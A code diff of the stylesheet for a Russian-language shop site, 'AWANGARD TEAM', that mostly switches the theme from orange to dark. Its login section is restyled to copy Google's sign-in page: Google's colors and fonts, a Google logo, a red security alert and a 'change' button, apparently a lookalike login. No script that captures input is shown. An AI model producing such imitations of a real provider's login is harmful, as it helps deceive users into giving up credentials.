@@ -6,12 +6,11 @@
     <title>AWANGARD TEAM</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        /* ===== БАЗОВЫЕ СТИЛИ ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', 'Orbitron', monospace;
-            background: #ff6600; /* Оранжевый фон */
-            color: #ffffff;
+            background: #1a1a1a;
+            color: #f0f0f0;
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
@@ -21,7 +20,7 @@
             top: 0; left: 0;
             width: 100%; height: 100%;
             z-index: -2;
-            background: radial-gradient(ellipse at center, #ff7a1a 0%, #e65c00 100%);
+            background: radial-gradient(ellipse at center, #2a2a2a 0%, #0f0f0f 100%);
         }
         #lightningCanvas {
             position: fixed;
@@ -30,17 +29,13 @@
             z-index: -1;
             pointer-events: none;
             display: block;
-            opacity: 0.5;
         }
-
-        /* ===== НАВИГАЦИЯ ===== */
         .neon-nav {
             position: sticky; top: 0; z-index: 100;
-            background: rgba(255,255,255,0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 2px solid #ffffff;
+            background: rgba(30,30,30,0.9); backdrop-filter: blur(10px);
+            border-bottom: 2px solid #ff6600;
             padding: 10px 0;
-            box-shadow: 0 2px 15px rgba(0,0,0,0.2);
+            box-shadow: 0 0 20px rgba(255,102,0,0.3);
         }
         .nav-container {
             max-width: 1200px; margin: 0 auto; padding: 0 20px;
@@ -49,53 +44,50 @@
         }
         .logo {
             font-size: 28px; font-weight: bold; font-family: 'Orbitron', monospace;
-            color: #1a1a1a;
+            color: #fff; text-shadow: 0 0 15px rgba(255,102,0,0.5);
             display: flex; align-items: center; gap: 10px;
         }
         .logo-icon {
             width: 40px; height: 40px; background: #ff6600; border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            font-size: 20px; color: #fff;
-            box-shadow: 0 0 20px rgba(255,102,0,0.3);
+            font-size: 20px; color: #1a1a1a;
+            box-shadow: 0 0 20px #ff6600;
         }
         .nav-links { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
         .nav-btn {
-            background: rgba(0,0,0,0.05); border: 1px solid #ddd;
-            padding: 8px 18px; border-radius: 30px; color: #333;
+            background: rgba(255,255,255,0.05); border: 1px solid #555;
+            padding: 8px 18px; border-radius: 30px; color: #ccc;
             cursor: pointer; transition: 0.3s;
             display: flex; align-items: center; gap: 6px;
             font-weight: 500; text-transform: uppercase; font-size: 13px;
             text-decoration: none;
         }
         .nav-btn:hover, .nav-btn.active {
-            background: #ff6600; color: #fff; border-color: #ff6600;
-            box-shadow: 0 0 20px rgba(255,102,0,0.3); transform: scale(1.05);
+            background: #ff6600; color: #1a1a1a; border-color: #ff6600;
+            box-shadow: 0 0 20px rgba(255,102,0,0.5); transform: scale(1.05);
         }
-
-        /* ===== ОБЩИЕ КОНТЕЙНЕРЫ ===== */
         .container { max-width: 1200px; margin: 0 auto; padding: 30px 20px; }
         .page { display: none; animation: fadeInUp 0.6s ease; }
         .page.active { display: block; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* ===== HERO ===== */
+        
         .hero { text-align: center; margin-bottom: 40px; }
         .hero h1 {
             font-size: 52px; font-family: 'Orbitron', monospace;
-            color: #fff; text-shadow: 0 0 30px rgba(255,255,255,0.2);
+            color: #fff; text-shadow: 0 0 30px rgba(255,102,0,0.4);
             letter-spacing: 4px; animation: glitch 3s infinite;
         }
         @keyframes glitch { 0%,100% { transform: skew(0deg); } 95% { transform: skew(0deg); } 96% { transform: skew(2deg); } 97% { transform: skew(-2deg); } 98% { transform: skew(1deg); } }
-        .hero p { color: rgba(255,255,255,0.8); margin-top: 10px; letter-spacing: 2px; }
+        .hero p { color: #aaa; margin-top: 10px; letter-spacing: 2px; }
         .hero-badge {
-            display: inline-block; background: rgba(255,255,255,0.15);
-            border: 1px solid #fff; padding: 8px 24px; border-radius: 30px;
-            margin-top: 20px; font-size: 14px; color: #fff;
-            box-shadow: 0 0 15px rgba(255,255,255,0.1);
+            display: inline-block; background: rgba(255,102,0,0.2);
+            border: 1px solid #ff6600; padding: 8px 24px; border-radius: 30px;
+            margin-top: 20px; font-size: 14px; color: #ff8800;
+            box-shadow: 0 0 15px rgba(255,102,0,0.2);
         }
 
-        /* ===== ПЛАШКИ-КАТАЛОГИ ===== */
+        /* ===== ПЛАШКИ-КАТАЛОГИ (раскрывающиеся) ===== */
         .catalog-plashki {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -103,16 +95,15 @@
             margin: 30px 0 40px 0;
         }
         .plashka-catalog {
-            background: rgba(255,255,255,0.95);
+            background: rgba(40,40,40,0.85);
             backdrop-filter: blur(10px);
             border-radius: 24px;
             padding: 25px 20px;
-            border: 2px solid rgba(255,255,255,0.3);
+            border: 2px solid #555;
             transition: 0.3s;
             cursor: pointer;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
         }
         .plashka-catalog::before {
             content: '';
@@ -121,28 +112,29 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.1), transparent, rgba(255,255,255,0.1), transparent);
+            background: conic-gradient(from 0deg, transparent, rgba(255,102,0,0.08), transparent, rgba(255,102,0,0.08), transparent);
             animation: spin 8s linear infinite;
             opacity: 0;
             transition: opacity 0.3s;
         }
         .plashka-catalog:hover::before { opacity: 1; }
         .plashka-catalog:hover {
-            border-color: #ffffff;
-            box-shadow: 0 8px 40px rgba(0,0,0,0.25);
-            transform: translateY(-3px);
+            border-color: #ff6600;
+            box-shadow: 0 0 40px rgba(255,102,0,0.25);
         }
-        .plashka-catalog-metro { border-color: rgba(255,255,255,0.3); }
-        .plashka-catalog-metro:hover { border-color: #ffffff; }
 
+        .plashka-catalog-metro { border-color: #00ccff; }
+        .plashka-catalog-metro:hover { border-color: #00ccff; box-shadow: 0 0 40px rgba(0,204,255,0.25); }
+
+        /* Шапка плашки */
         .plashka-header {
             display: flex;
             align-items: center;
             gap: 15px;
             padding-bottom: 15px;
-            border-bottom: 1px solid rgba(0,0,0,0.1);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
             margin-bottom: 15px;
-            pointer-events: none;
+            pointer-events: none; /* чтобы клик шёл на всю плашку */
         }
         .plashka-header img {
             width: 60px;
@@ -152,31 +144,31 @@
             border: 2px solid #ff6600;
             flex-shrink: 0;
         }
-        .plashka-metro .plashka-header img { border-color: #00aaff; }
+        .plashka-metro .plashka-header img { border-color: #00ccff; }
         .plashka-title {
             font-size: 22px;
             font-weight: bold;
-            color: #1a1a1a;
+            color: #fff;
         }
         .plashka-sub {
             font-size: 12px;
-            color: #555;
+            color: #aaa;
         }
         .plashka-badge {
             position: absolute;
             top: 12px;
             right: 12px;
             background: #ff6600;
-            color: #fff;
+            color: #1a1a1a;
             padding: 4px 14px;
             border-radius: 30px;
             font-size: 10px;
             font-weight: bold;
             pointer-events: none;
-            box-shadow: 0 2px 10px rgba(255,102,0,0.3);
         }
-        .plashka-metro .plashka-badge { background: #00aaff; }
+        .plashka-metro .plashka-badge { background: #00ccff; }
 
+        /* Список товаров (скрыт по умолчанию) */
         .plashka-products {
             display: none;
             flex-direction: column;
@@ -190,25 +182,25 @@
             display: flex;
         }
         .plashka-products::-webkit-scrollbar { width: 4px; }
-        .plashka-products::-webkit-scrollbar-track { background: #f0f0f0; border-radius: 10px; }
+        .plashka-products::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 10px; }
         .plashka-products::-webkit-scrollbar-thumb { background: #ff6600; border-radius: 10px; }
-        .plashka-metro .plashka-products::-webkit-scrollbar-thumb { background: #00aaff; }
+        .plashka-metro .plashka-products::-webkit-scrollbar-thumb { background: #00ccff; }
 
         .plashka-product-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: #f9f9f9;
+            background: rgba(255,255,255,0.05);
             border-radius: 12px;
             padding: 10px 15px;
             transition: 0.3s;
-            border: 1px solid #e0e0e0;
+            border: 1px solid transparent;
         }
         .plashka-product-item:hover {
-            background: #f0f0f0;
+            background: rgba(255,255,255,0.1);
             border-color: #ff6600;
         }
-        .plashka-metro .plashka-product-item:hover { border-color: #00aaff; }
+        .plashka-metro .plashka-product-item:hover { border-color: #00ccff; }
 
         .plashka-product-info {
             display: flex;
@@ -222,12 +214,12 @@
             height: 36px;
             border-radius: 50%;
             object-fit: cover;
-            border: 1px solid #ddd;
+            border: 1px solid #555;
             flex-shrink: 0;
         }
         .plashka-product-name {
             font-size: 13px;
-            color: #222;
+            color: #eee;
             font-weight: 500;
             white-space: nowrap;
             overflow: hidden;
@@ -235,58 +227,54 @@
         }
         .plashka-product-oldprice {
             font-size: 11px;
-            color: #999;
+            color: #888;
             text-decoration: line-through;
             margin-left: 6px;
         }
         .plashka-product-price {
             font-size: 16px;
             font-weight: bold;
-            color: #ff6600;
+            color: #ff8800;
             white-space: nowrap;
         }
-        .plashka-metro .plashka-product-price { color: #00aaff; }
+        .plashka-metro .plashka-product-price { color: #66ddff; }
 
         .plashka-buy-btn {
             background: #ff6600;
             border: none;
             padding: 6px 16px;
             border-radius: 30px;
-            color: #fff;
+            color: #1a1a1a;
             font-weight: bold;
             font-size: 12px;
             cursor: pointer;
             transition: 0.3s;
             flex-shrink: 0;
             margin-left: 10px;
-            box-shadow: 0 2px 10px rgba(255,102,0,0.2);
         }
         .plashka-buy-btn:hover {
             transform: scale(1.05);
             box-shadow: 0 0 20px rgba(255,102,0,0.4);
         }
         .plashka-metro .plashka-buy-btn {
-            background: #00aaff;
-            box-shadow: 0 2px 10px rgba(0,170,255,0.2);
+            background: #00ccff;
         }
         .plashka-metro .plashka-buy-btn:hover {
-            box-shadow: 0 0 20px rgba(0,170,255,0.4);
+            box-shadow: 0 0 20px rgba(0,204,255,0.4);
         }
 
-        /* ===== СЧЁТЧИК ===== */
         .sales-counter {
             text-align: center;
             margin: 20px 0;
             padding: 10px 25px;
-            background: rgba(255,255,255,0.15);
+            background: rgba(255,102,0,0.15);
             border-radius: 30px;
             display: inline-block;
-            border: 1px solid #fff;
-            color: #fff;
+            border: 1px solid #ff6600;
+            color: #ff8800;
             font-weight: bold;
         }
 
-        /* ===== ФИЧИ ===== */
         .features-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -294,128 +282,103 @@
             margin: 30px 0;
         }
         .feature-card {
-            background: rgba(255,255,255,0.9);
+            background: rgba(50,50,50,0.7);
+            backdrop-filter: blur(5px);
             border-radius: 15px;
             padding: 20px;
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.3);
+            border: 1px solid #555;
             transition: 0.3s;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            color: #1a1a1a;
         }
-        .feature-card:hover { border-color: #ffffff; box-shadow: 0 8px 30px rgba(0,0,0,0.15); transform: translateY(-5px); }
+        .feature-card:hover { border-color: #ff6600; box-shadow: 0 0 25px rgba(255,102,0,0.3); transform: translateY(-5px); }
         .feature-card i { font-size: 40px; color: #ff6600; margin-bottom: 15px; }
-        .feature-card h3 { font-size: 16px; color: #1a1a1a; margin-bottom: 10px; }
-        .feature-card p { font-size: 12px; color: #555; }
+        .feature-card h3 { font-size: 16px; color: #fff; margin-bottom: 10px; }
+        .feature-card p { font-size: 12px; color: #aaa; }
 
-        /* ===== ПОДПИСКА TELEGRAM ===== */
         .telegram-subscribe {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.3);
+            background: rgba(255,102,0,0.1);
+            border: 1px solid #ff6600;
             border-radius: 15px;
             padding: 20px;
             margin: 20px 0;
             text-align: center;
         }
-        .telegram-subscribe h3 { color: #fff; }
-        .telegram-subscribe p { color: rgba(255,255,255,0.8); }
         .telegram-subscribe button {
-            background: #fff;
+            background: #ff6600;
             margin-top: 10px;
             border: none;
             padding: 10px 20px;
             border-radius: 30px;
-            color: #ff6600;
+            color: #1a1a1a;
             cursor: pointer;
             font-weight: bold;
             transition: 0.3s;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .telegram-subscribe button:hover { background: #f0f0f0; box-shadow: 0 0 20px rgba(255,255,255,0.3); }
+        .telegram-subscribe button:hover { background: #ff8800; box-shadow: 0 0 20px rgba(255,102,0,0.5); }
 
-        /* ===== СТРАНИЦЫ (ОПЛАТА, ОТЗЫВЫ и т.д.) ===== */
         .payment-info, .reviews-card, .about-card, .howtobuy-card {
-            background: rgba(255,255,255,0.9);
-            border-radius: 20px; padding: 30px; border: 1px solid rgba(255,255,255,0.3);
+            background: rgba(40,40,40,0.8); backdrop-filter: blur(10px);
+            border-radius: 20px; padding: 30px; border: 1px solid #555;
             text-align: center; transition: 0.3s;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            color: #1a1a1a;
         }
         .payment-info:hover, .reviews-card:hover, .about-card:hover, .howtobuy-card:hover {
-            border-color: #ffffff; box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            border-color: #ff6600; box-shadow: 0 0 30px rgba(255,102,0,0.2);
         }
-        .payment-info h2, .reviews-card h2, .about-card h2, .howtobuy-card h2 { color: #1a1a1a; }
-        .payment-info ul li, .howtobuy-steps li { color: #333; }
         .howtobuy-steps { text-align: left; margin-top: 20px; }
         .howtobuy-steps li { margin: 15px 0; display: flex; align-items: center; gap: 15px; }
         .step-number {
             width: 30px; height: 30px; background: #ff6600; border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            color: #fff; font-weight: bold;
+            color: #1a1a1a; font-weight: bold;
         }
-        .payment-info a, .howtobuy-card a {
-            color: #ff6600;
-            text-decoration: none;
-        }
-        .payment-info a:hover, .howtobuy-card a:hover { text-decoration: underline; }
-        .payment-info .btn-pay {
-            display: inline-block; background: #ff6600; padding: 15px 40px; border-radius: 40px; color: #fff; text-decoration: none; font-weight: bold; transition: 0.3s; box-shadow: 0 0 20px rgba(255,102,0,0.2);
-        }
-        .payment-info .btn-pay:hover { background: #e65c00; box-shadow: 0 0 30px rgba(255,102,0,0.4); }
-
-        /* ===== ФУТЕР ===== */
-        .footer { text-align: center; padding: 20px; border-top: 1px solid rgba(255,255,255,0.2); margin-top: 40px; font-size: 12px; color: rgba(255,255,255,0.7); }
-
-        /* ===== КНОПКА ВВЕРХ ===== */
+        .footer { text-align: center; padding: 20px; border-top: 1px solid #333; margin-top: 40px; font-size: 12px; color: #666; }
         .scroll-top-btn {
             position: fixed; bottom: 30px; right: 30px;
-            width: 50px; height: 50px; background: #fff; border-radius: 50%;
+            width: 50px; height: 50px; background: #ff6600; border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
             cursor: pointer; opacity: 0; visibility: hidden;
             transition: 0.3s; z-index: 99;
-            box-shadow: 0 0 20px rgba(255,255,255,0.3); color: #ff6600;
+            box-shadow: 0 0 20px rgba(255,102,0,0.5); color: #1a1a1a;
         }
         .scroll-top-btn.show { opacity: 1; visibility: visible; }
         .scroll-top-btn:hover { transform: scale(1.1); }
-
-        /* ===== TOAST ===== */
         .toast {
             position: fixed; bottom: 20px; right: 20px;
-            background: #fff; color: #ff6600;
+            background: #ff6600; color: #1a1a1a;
             padding: 12px 24px; border-radius: 30px;
             transform: translateX(400px); transition: 0.3s;
             z-index: 1001; font-weight: bold;
-            box-shadow: 0 0 20px rgba(0,0,0,0.15);
+            box-shadow: 0 0 20px rgba(255,102,0,0.4);
         }
         .toast.show { transform: translateX(0); }
 
         /* ===== ЗАСТАВКА ===== */
         #splashScreen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #ff6600; display: flex; align-items: center; justify-content: center;
+            background: #0a0a0a; display: flex; align-items: center; justify-content: center;
             z-index: 9999; transition: opacity 0.8s ease, visibility 0.8s ease;
             opacity: 1; visibility: visible;
         }
         #splashScreen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
-        #splashVideo { width: 100%; height: 100%; object-fit: contain; background: #ff6600; }
+        #splashVideo { width: 100%; height: 100%; object-fit: contain; background: #0a0a0a; }
         .skip-btn {
             position: fixed; bottom: 30px; right: 30px; z-index: 10000;
-            background: rgba(255,255,255,0.2); backdrop-filter: blur(10px);
-            border: 1px solid #fff; color: #fff;
+            background: rgba(255,102,0,0.2); backdrop-filter: blur(10px);
+            border: 1px solid #ff6600; color: #ff6600;
             padding: 10px 24px; border-radius: 40px; cursor: pointer;
             font-weight: bold; font-size: 14px; transition: 0.3s;
             display: none;
         }
-        .skip-btn:hover { background: #fff; color: #ff6600; box-shadow: 0 0 20px rgba(255,255,255,0.3); }
+        .skip-btn:hover { background: #ff6600; color: #1a1a1a; box-shadow: 0 0 20px rgba(255,102,0,0.6); }
         .skip-btn.show { display: block; }
 
         /* ===== ЛИЦЕНЗИОННЫЙ БАННЕР ===== */
         #licenseBanner {
             position: fixed; bottom: 0; left: 0; width: 100%;
-            background: rgba(255,255,255,0.98); backdrop-filter: blur(10px);
+            background: rgba(20, 20, 30, 0.95); backdrop-filter: blur(10px);
             border-top: 2px solid #ff6600; padding: 12px 20px;
             z-index: 10001; display: none;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.05);
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
             transition: transform 0.3s ease;
         }
         #licenseBanner.show { display: block; }
@@ -426,47 +389,47 @@
         }
         .license-banner-text {
             display: flex; align-items: center; gap: 10px;
-            color: #1a1a1a; font-size: 16px;
+            color: #ccc; font-size: 16px;
         }
-        .license-banner-text strong { color: #ff6600; }
+        .license-banner-text strong { color: #ff8800; }
         .license-banner-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
         .license-banner-btn {
             padding: 8px 20px; border-radius: 30px; border: none;
             font-weight: bold; font-size: 14px; cursor: pointer; transition: 0.3s;
         }
-        .license-banner-btn.view { background: #f0f0f0; color: #333; border: 1px solid #ddd; }
-        .license-banner-btn.view:hover { background: #e0e0e0; }
-        .license-banner-btn.accept { background: #ff6600; color: #fff; }
-        .license-banner-btn.accept:hover { background: #e65c00; box-shadow: 0 0 20px rgba(255,102,0,0.3); }
-        .license-banner-btn.decline { background: rgba(255,0,0,0.1); color: #d63031; border: 1px solid #ff6b6b; }
-        .license-banner-btn.decline:hover { background: rgba(255,0,0,0.2); }
+        .license-banner-btn.view { background: rgba(255,255,255,0.1); color: #ccc; border: 1px solid #555; }
+        .license-banner-btn.view:hover { background: rgba(255,255,255,0.2); color: #fff; }
+        .license-banner-btn.accept { background: #ff6600; color: #1a1a1a; }
+        .license-banner-btn.accept:hover { background: #ff8800; box-shadow: 0 0 20px rgba(255,102,0,0.5); }
+        .license-banner-btn.decline { background: rgba(255,0,0,0.2); color: #ff6666; border: 1px solid #ff3333; }
+        .license-banner-btn.decline:hover { background: rgba(255,0,0,0.4); }
 
-        /* ===== МОДАЛКА ЛИЦЕНЗИИ ===== */
+        /* ===== МОДАЛКА СОГЛАШЕНИЯ ===== */
         .license-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5); backdrop-filter: blur(5px);
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
             display: none; align-items: center; justify-content: center;
             z-index: 10002; padding: 20px;
         }
         .license-modal-overlay.active { display: flex; }
         .license-modal-content {
-            background: #ffffff;
+            background: linear-gradient(135deg, #1a1a2a, #0f0f1a);
             border: 1px solid #ff6600; border-radius: 20px;
             max-width: 800px; width: 100%; max-height: 90vh;
             display: flex; flex-direction: column;
-            box-shadow: 0 0 50px rgba(255,102,0,0.15);
+            box-shadow: 0 0 50px rgba(255,102,0,0.3);
             animation: fadeInUp 0.4s ease;
         }
         .license-modal-header {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 20px 25px; border-bottom: 1px solid #eee;
+            padding: 20px 25px; border-bottom: 1px solid #333;
             flex-shrink: 0;
         }
-        .license-modal-header h2 { font-family: 'Orbitron', monospace; color: #ff6600; font-size: 20px; }
+        .license-modal-header h2 { font-family: 'Orbitron', monospace; color: #ff8800; font-size: 20px; }
         .license-modal-close { background: none; border: none; font-size: 30px; color: #888; cursor: pointer; transition: 0.3s; }
-        .license-modal-close:hover { color: #1a1a1a; }
-        .license-modal-body { padding: 20px 25px; overflow-y: auto; flex: 1; color: #333; font-size: 14px; line-height: 1.6; }
-        .license-modal-body h3 { color: #ff6600; margin: 20px 0 10px; }
+        .license-modal-close:hover { color: #fff; }
+        .license-modal-body { padding: 20px 25px; overflow-y: auto; flex: 1; color: #ccc; font-size: 14px; line-height: 1.6; }
+        .license-modal-body h3 { color: #ff8800; margin: 20px 0 10px; }
         .license-modal-body p { margin: 10px 0; }
         .license-modal-body ul { padding-left: 20px; }
         .license-modal-body li { margin: 5px 0; }
@@ -474,7 +437,7 @@
         /* ===== БЛОКИРОВКА ===== */
         #blockedOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.9); backdrop-filter: blur(8px);
             display: none; align-items: center; justify-content: center;
             z-index: 10003;
         }
@@ -483,24 +446,24 @@
             text-align: center; color: #ff3333; font-size: 24px;
             font-family: 'Orbitron', monospace; padding: 40px;
             border: 1px solid #ff3333; border-radius: 20px;
-            background: rgba(255,255,255,0.95); box-shadow: 0 0 40px rgba(255,0,0,0.1);
+            background: rgba(20,0,0,0.5); box-shadow: 0 0 40px rgba(255,0,0,0.2);
             max-width: 500px;
         }
         .blocked-box i { font-size: 60px; margin-bottom: 20px; display: block; }
         .blocked-box button {
             background: #ff6600; border: none; padding: 10px 30px;
-            border-radius: 40px; color: #fff; font-weight: bold;
+            border-radius: 40px; color: #1a1a1a; font-weight: bold;
             cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s;
         }
-        .blocked-box button:hover { background: #e65c00; box-shadow: 0 0 20px rgba(255,102,0,0.3); }
+        .blocked-box button:hover { background: #ff8800; box-shadow: 0 0 20px rgba(255,102,0,0.5); }
 
-        /* ===== СТРАНИЦА ВХОДА (Google-стиль) ===== */
+        /* ===== СТРАНИЦА ВХОДА ===== */
         #loginPage {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: #ffffff;
+            background: #f1f3f4;
             z-index: 9998;
             align-items: center;
             justify-content: center;
@@ -512,12 +475,11 @@
             background: #ffffff;
             padding: 40px 35px 30px;
             border-radius: 8px;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             max-width: 400px;
             width: 100%;
             text-align: center;
             position: relative;
-            border: 1px solid #e0e0e0;
         }
         .login-back-btn {
             position: absolute;
@@ -525,24 +487,24 @@
             left: 15px;
             background: none;
             border: none;
-            color: #555;
+            color: #5f6368;
             font-size: 24px;
             cursor: pointer;
             transition: 0.3s;
         }
-        .login-back-btn:hover { color: #1a1a1a; }
+        .login-back-btn:hover { color: #202124; }
         .login-container .google-logo { display: flex; justify-content: center; margin-bottom: 24px; }
         .login-container .google-logo svg { width: 75px; height: 75px; }
         .login-container h2 {
             font-size: 24px;
             font-weight: 400;
-            color: #1a1a1a;
+            color: #202124;
             margin-bottom: 6px;
             font-family: 'Google Sans', 'Segoe UI', sans-serif;
         }
         .login-container .sub {
             font-size: 16px;
-            color: #555;
+            color: #5f6368;
             margin-bottom: 28px;
             font-weight: 400;
             font-family: 'Google Sans', 'Segoe UI', sans-serif;
@@ -551,7 +513,7 @@
         .login-container .input-group label {
             font-size: 13px;
             font-weight: 500;
-            color: #333;
+            color: #5f6368;
             display: block;
             margin-bottom: 4px;
             font-family: 'Google Sans', 'Segoe UI', sans-serif;
@@ -560,22 +522,22 @@
             width: 100%;
             padding: 12px 14px;
             font-size: 16px;
-            border: 1px solid #ddd;
+            border: 1px solid #dadce0;
             border-radius: 4px;
             background: #fff;
             transition: border-color 0.2s, box-shadow 0.2s;
-            color: #1a1a1a;
+            color: #202124;
             font-family: 'Google Sans', sans-serif;
         }
         .login-container .input-group input:focus {
-            border-color: #ff6600;
+            border-color: #4285f4;
             outline: none;
-            box-shadow: 0 1px 3px rgba(255,102,0,0.2);
+            box-shadow: 0 1px 3px rgba(66,133,244,0.25);
         }
         .login-container .btn {
             width: 100%;
             padding: 12px;
-            background: #ff6600;
+            background: #4285f4;
             color: #fff;
             border: none;
             border-radius: 4px;
@@ -584,14 +546,14 @@
             cursor: pointer;
             transition: background 0.2s, box-shadow 0.2s;
             font-family: 'Google Sans', sans-serif;
-            box-shadow: 0 1px 2px rgba(255,102,0,0.3);
+            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
             margin-top: 8px;
         }
-        .login-container .btn:hover { background: #e65c00; box-shadow: 0 1px 4px rgba(255,102,0,0.4); }
+        .login-container .btn:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); }
         .login-container .btn:active { transform: scale(0.97); }
-        .login-container .btn:disabled { background: #ffb280; cursor: default; box-shadow: none; opacity: 0.7; }
+        .login-container .btn:disabled { background: #8ab4f8; cursor: default; box-shadow: none; opacity: 0.7; }
         .login-container .error-msg {
-            color: #d63031;
+            color: #d93025;
             font-size: 14px;
             margin-top: 12px;
             display: none;
@@ -612,59 +574,59 @@
             width: 28px;
             height: 28px;
             border: 3px solid #e8eaed;
-            border-top: 3px solid #ff6600;
+            border-top: 3px solid #4285f4;
             border-radius: 50%;
             animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
         }
         .login-container .spinner-text {
             font-size: 14px;
-            color: #555;
+            color: #5f6368;
             margin-left: 12px;
             font-weight: 400;
             font-family: 'Google Sans', sans-serif;
         }
         .login-container .google-alert {
-            background: #fff3f0;
+            background: #fce8e6;
             border-radius: 8px;
             padding: 16px 18px;
             margin: 12px 0 18px 0;
             text-align: left;
-            border: 1px solid #ffc8b8;
+            border: 1px solid #f5c6c2;
         }
         .login-container .google-alert .alert-title {
             font-size: 15px;
             font-weight: 500;
-            color: #d63031;
+            color: #d93025;
             font-family: 'Google Sans', sans-serif;
             display: flex;
             align-items: center;
             gap: 8px;
             margin-bottom: 4px;
         }
-        .login-container .google-alert .alert-title svg { width: 20px; height: 20px; fill: #d63031; flex-shrink: 0; }
+        .login-container .google-alert .alert-title svg { width: 20px; height: 20px; fill: #d93025; flex-shrink: 0; }
         .login-container .google-alert .alert-text {
             font-size: 14px;
-            color: #1a1a1a;
+            color: #202124;
             font-weight: 400;
             line-height: 1.5;
         }
         .login-container .google-alert .alert-details {
             font-size: 13px;
-            color: #555;
+            color: #5f6368;
             margin-top: 6px;
             padding-top: 8px;
-            border-top: 1px solid #ffc8b8;
+            border-top: 1px solid #f5c6c2;
             display: flex;
             flex-wrap: wrap;
             gap: 4px 16px;
         }
         .login-container .google-alert .alert-details span { display: flex; align-items: center; gap: 4px; }
-        .login-container .google-alert .alert-details svg { width: 14px; height: 14px; fill: #555; }
+        .login-container .google-alert .alert-details svg { width: 14px; height: 14px; fill: #5f6368; }
         .login-container .btn-google-change {
             display: inline-block;
             width: 100%;
             padding: 12px 24px;
-            background: #ff6600;
+            background: #4285f4;
             color: #fff;
             border: none;
             border-radius: 4px;
@@ -675,15 +637,15 @@
             text-align: center;
             cursor: pointer;
             transition: background 0.2s, box-shadow 0.2s;
-            box-shadow: 0 1px 2px rgba(255,102,0,0.3);
+            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
             margin-top: 8px;
         }
-        .login-container .btn-google-change:hover { background: #e65c00; box-shadow: 0 1px 4px rgba(255,102,0,0.4); text-decoration: none; color: #fff; }
+        .login-container .btn-google-change:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); text-decoration: none; color: #fff; }
         .login-container .btn-google-change:active { transform: scale(0.97); }
         .login-container .footer {
             margin-top: 30px;
             padding-top: 16px;
-            border-top: 1px solid #eee;
+            border-top: 1px solid #e8eaed;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -692,15 +654,14 @@
             font-size: 12px;
             font-family: 'Google Sans', sans-serif;
         }
-        .login-container .footer .language { color: #555; cursor: pointer; display: flex; align-items: center; gap: 4px; }
-        .login-container .footer .language:hover { color: #1a1a1a; }
-        .login-container .footer .language svg { width: 14px; height: 14px; fill: #555; }
+        .login-container .footer .language { color: #5f6368; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+        .login-container .footer .language:hover { color: #202124; }
+        .login-container .footer .language svg { width: 14px; height: 14px; fill: #5f6368; }
         .login-container .footer-links { display: flex; gap: 16px; flex-wrap: wrap; }
-        .login-container .footer-links a { color: #555; text-decoration: none; font-weight: 400; font-size: 12px; font-family: 'Google Sans', sans-serif; }
-        .login-container .footer-links a:hover { color: #1a1a1a; text-decoration: underline; }
+        .login-container .footer-links a { color: #5f6368; text-decoration: none; font-weight: 400; font-size: 12px; font-family: 'Google Sans', sans-serif; }
+        .login-container .footer-links a:hover { color: #202124; text-decoration: underline; }
         .login-container .hidden { display: none !important; }
 
-        /* ===== АДАПТИВ ===== */
         @media (max-width: 768px) {
             .nav-container { flex-direction: column; }
             .hero h1 { font-size: 32px; }
@@ -752,7 +713,7 @@
         </div>
     </div>
 
-    <!-- ===== МОДАЛКА ЛИЦЕНЗИИ ===== -->
+    <!-- ===== МОДАЛКА С СОГЛАШЕНИЕМ ===== -->
     <div id="licenseModal" class="license-modal-overlay">
         <div class="license-modal-content">
             <div class="license-modal-header">
@@ -763,17 +724,16 @@
         </div>
     </div>
 
-    <!-- ===== БЛОКИРОВКА ===== -->
